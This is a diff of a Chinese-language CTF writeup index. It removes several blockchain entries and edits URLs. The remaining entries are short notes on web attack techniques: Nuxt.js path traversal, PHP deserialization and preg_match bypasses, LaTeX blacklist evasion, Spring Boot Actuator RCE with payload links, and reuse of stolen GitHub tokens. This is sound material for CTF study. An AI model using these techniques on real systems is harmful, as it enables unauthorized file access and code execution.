-- EVM内部有function selector，selector是一个以hex格式表示的长度为4个字节的标识符，从函数签名中得来。无法逆向selector，意味着无法在得到selector的情况下的得知该函数的签名；但是可以里用[网站](https://www.4byte.directory/)的数据库查询。可以从合约的bytecode里获取selector，关注下面这段汇编：
-```
-PUSH4 <selector>
-EQ
-PUSH <code_dest>
-JUMPI
-```
-347. [Un Secure](https://berliangabriel.github.io/post/tcp1p-ctf-2023/)
+343. `*`
+344. `*`
+345. `*`
+346. `*`
+347. [Un Secure](https://berliangabriel.github.io/post/tcp1p-ctf-2023)
 - php反序列化漏洞：通过串联多个类获得RCE。这里想提的是php网站里的vendor文件夹和composer.json。可以在composer.json里配置autoload，然后require `vendor/autoload.php`。这样在反序列化/编写文件时会自动包含autoload里提到的类。参考 https://stackoverflow.com/questions/57720711/what-should-i-do-to-using-vendor-folder-located-classes-after-download-via-compo 和 https://getcomposer.org/doc/01-basic-usage.md#autoloading
-348. [A Simple Web](https://berliangabriel.github.io/post/tcp1p-ctf-2023/)
-- 版本小于等于rc12的[Nuxt.js](https://github.com/nuxt/framework)在dev mode运行时有路径穿越漏洞，参考 https://huntr.com/bounties/4849af83-450c-435e-bc0b-71705f5be440/ 。可用`/_nuxt/@fs/filename`读取任意文件
-349. [Latex](https://berliangabriel.github.io/post/tcp1p-ctf-2023/)
+348. [A Simple Web](https://berliangabriel.github.io/post/tcp1p-ctf-2023)
+- 版本小于等于rc12的[Nuxt.js](https://github.com/nuxt/framework)在dev mode运行时有路径穿越漏洞，参考 https://huntr.com/bounties/4849af83-450c-435e-bc0b-71705f5be440 。可用`/_nuxt/@fs/filename`读取任意文件
+349. [Latex](https://berliangabriel.github.io/post/tcp1p-ctf-2023)
 - 尝试用latex读取文件，但是需要绕过黑名单。wp的做法利用`\catcode`改变字符的category code。比如\catcode`\@=0,将@字符的作用改成了\，以后需要用\的地方都可以用@代替。额外地，还可以利用这个方法将_改成13。因为flag里通常包含下划线，改成13后不会让latex报错
 - 其他做法: https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#latex
 350. [love card](https://github.com/4n86rakam1/writeup/blob/main/TCP1PCTF_2023/Web/love_card/index.md)
@@ -3826,16 +3607,9 @@ next();
 ```
 当JSON.parse报错时，会进入catch分支，然后直接next，从而绕过if的检查admin权限逻辑
 - 视频wp： https://www.youtube.com/watch?v=JetPydd3ud4
-369. [GlacierCoin](https://themj0ln1r.github.io/writeups/glacierctf23)
-- solidity blockchain Reentrancy attack
-- `(msg.sender).call`会调用msg.sender的fallback()函数。用receive()也行： https://github.com/Brivan-26/GlacierCTF2k23-SmartContracts-writeups
-- forge script使用
-370. [GlacierVault](https://themj0ln1r.github.io/posts/glacierctf23)
-- solidity blockchain [delegatecall使用](https://medium.com/@ajaotosinserah/mastering-delegatecall-in-solidity-a-comprehensive-guide-with-evm-walkthrough-6ddf027175c7)。简单来说，假设合约A使用delegatecall调用合约B的某个方法C，则执行方法C时内部所使用的storage是合约A而不是B的。也就是，本来方法C内部修改的是合约B的某些字段，假设在D处；但使用delegatecall后，实际修改的storage是合约A在D处的内存
-- 其他wp： https://github.com/Brivan-26/GlacierCTF2k23-SmartContracts-writeups?tab=readme-ov-file#02---glaciervault
-371. [ChairLift](https://themj0ln1r.github.io/posts/glacierctf23)
-- solidity blockchain erecover的特殊情况。erecover的函数签名如下：`ecrecover(digest, v, r, s)`，用于恢复签名者的地址。当v，r和s都是0时，会恢复出address(0)（这种情况表示签名invalid，代码中应该有检查签名是否valid然后revert的逻辑）
-- 其他wp： https://github.com/Brivan-26/GlacierCTF2k23-SmartContracts-writeups?tab=readme-ov-file#03---chairlift
+369. `*`
+370. `*`
+371. `*`
 372. [Glacier Exchange](https://github.com/4n86rakam1/writeup/tree/main/GlacierCTF_2023/web/Glacier_Exchange)
 - python的浮点数有一些特殊值：inf，nan等，都大于任何实际上的数字。而且python里的浮点数也是有溢出的
 373. [Peak](https://github.com/4n86rakam1/writeup/tree/main/GlacierCTF_2023/web/Peak)
@@ -3918,8 +3692,7 @@ window.recaptcha=true;
 387. [tsh-go](https://github.com/CykuTW/tsh-go):go语言写的小型网站后门
 388. [Armoured-notes](https://github.com/Pratham1812/ctf-writeups/tree/master/BackdoorCTF2023/armoured-notes)
 - nodejs vite transformIndexHtml xss[漏洞](https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97?cve=title)。transformIndexHtml的使用方法为`transformIndexHtml(url,template)`，其中url为请求时的url。若该url未做过滤，攻击者可直接在该页面上获取xss（无关渲染的template）
-389. [BabyBlackJack](https://github.com/n0kto/ctf-writeups/tree/main/BackdoorCTF/BabyBlackJack)
-- solidity有关`block.number`的知识：one block contains one transaction which can contain multiple call (with all the same block number)
+389. `*`
 390. [Rocket Explorer](https://ireland.re/posts/Backdoor_CTF_2023_Web/#webrocket-explorer)
 - 若Spring Boot Actuator泄露(POST `/actuator/env`能得到内容，详细参考 https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/ 和 https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators#spring.datasource.hikari.connection-test-query )，攻击者可获取RCE。payload： https://github.com/spaceraccoon/spring-boot-actuator-h2-rce
 391. [VulnChain](https://github.com/n0kto/ctf-writeups/tree/main/BackdoorCTF/VulnChain),[wp](https://oboembus.tech/blog/backdoor-ctf)
@@ -3983,13 +3756,7 @@ window.recaptcha=true;
     - https://samuzora.com/posts/rwctf-2024/
         - 这个解法利用了`FileSystemXmlApplicationContext`加载一个外部xml并在xml里执行命令。这样就不用担心thymeleaf内部的过滤了
     - https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#chatterbox
-405. [SafeBridge](https://chovid99.github.io/posts/real-world-ctf-2024/)
-- 两个blockchain网络之间无法通信，需要借助bridge来在两者之间传输资源。遇见的第一个环境内有多个blockchain的题目
-- foundry CLI工具使用+如何创建自己的简易token并deploy。注意自己的token若想给别的合约使用需要调用approve函数
-- 其他wp（使用solidity+forge）：
-    - https://github.com/iczc/rwctf-6th-safebridge/tree/main/project/script
-    - https://github.com/Kaiziron/real-world-ctf-6th-writeups
-    - https://hodl.page/entry/RealWorldCTF-2023-blockchainsafebridge
+405. `*`
 406. [minioday](https://github.com/mmm-team/public-writeups/tree/main/rwctf2024/minioday)
 - minio CVE-2023-28434漏洞利用，可在minio服务器上执行任意代码
 - 其他做法： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#minioday
@@ -4013,8 +3780,7 @@ window.recaptcha=true;
 - 类似Calculator，但是禁止加注释和使用as与any。解法是利用eval覆盖函数，使返回的数字类型实际上是字符串（更详细内容参考 https://one3147.tistory.com/77 ）
 - 利用window.name缩短xss payload长度
 - 其他解法：**calculator-2** ，Calculator的其他解法中也有部分可适用于这道题
-412. [floordrop](https://hodl.page/entry/DiceCTF-2024-Quals-floordropblockchain)
-- (完全看不懂)solidity blockchain frontrunning。唯一明白的点是提高gas price让服务器先执行我们要的函数再执行其他函数。作者还提到了一个bomb的概念，用bomb将一个block内所有的gas消耗完毕，剩下的调用会推迟到下一个block执行
+412. `*`
 413. [Simple WAF](https://github.com/abdoghazy2015/CTF-Write-Ups/tree/main/0xL4ughCTF2024/Web/Simple%20WAF)
 - php preg_match在执行失败时会返回`PREG_BACKTRACK_LIMIT_ERROR`，在if语句里作为条件会被强制转换为false。可以用`phpinfo()`查看php pcre的匹配上限，超过上限后便会匹配失败
 414. [DisLaugh](https://omakmoh.me/dislaugh/)
@@ -4128,8 +3894,7 @@ for _, bi := range ba {
 455. [The Mission](https://github.com/4n86rakam1/writeup/tree/main/NahamCon_CTF_2024/The_Mission)
 - 如果获取了github api的`Authorization(Bearer)`token，就可以访问诸如`https://api.github.com/user/repos`的github api获取这个token对应用户的仓库等内容
 - 另外这个系列的题目都是黑盒，也算积累例题了
-456. [Staker](/CTF/Codegate%20Junior/Staker.md)
-- web3 blockchain solidity题目实践
+456. `*`
 457. [Simple calculator](https://mrno0ne.notion.site/L3AK-CTF-Writeups-8dd136a6064b45f28891e7fae5e0d451)
 - php无字母引号命令执行。比赛的时候我参考了 https://xz.aliyun.com/t/11929 的payload，但是发现无法执行。后面发现原因是这道题的eval被包在函数popCalc里，如果eval不在函数里是可以正常执行的
 - 用8进制绕过也可以： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#write-up-for-simplecalculator-l3akctf-2024
